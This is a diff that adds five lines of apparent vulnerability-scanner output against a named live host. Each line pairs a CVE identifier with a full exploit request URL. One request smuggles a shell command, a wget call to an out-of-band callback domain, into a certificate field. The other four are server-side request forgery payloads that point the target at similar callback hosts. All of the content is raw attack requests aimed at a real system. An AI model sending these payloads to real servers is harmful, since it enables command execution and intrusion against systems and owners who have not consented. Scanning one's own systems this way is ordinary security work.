@@ -1,0 +1,5 @@
+[CVE-2021-33544] [http] [high] https://identity-v1.fileverse.io//uapi-cgi/certmngr.cgi?action=createselfcert&local=anything&country=AA&state=%24(wget%20http://d9446ltulefjee89v1o05p9o3yn5bt7xb.oast.live)&organization=anything&organizationunit=anything&commonname=anything&days=1&type=anything
+[CVE-2017-0929] [http] [high] https://identity-v1.fileverse.io/DnnImageHandler.ashx?mode=file&url=http://d9446ltulefjee89v1o0fsccow8689hty.oast.live
+[CVE-2017-18638] [http] [high] https://identity-v1.fileverse.io/composer/send_email?to=JlFM@vrwW&url=http://d9446ltulefjee89v1o0g5d56m87ha1ho.oast.live
+[CVE-2018-1000600] [http] [high] https://identity-v1.fileverse.io/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://d9446ltulefjee89v1o07ezyhfcfd1g7q.oast.live
+[CVE-2015-8813] [http] [high] https://identity-v1.fileverse.io/Umbraco/feedproxy.aspx?url=http://d9446ltulefjee89v1o0jhbsp7zwq8swb.oast.live
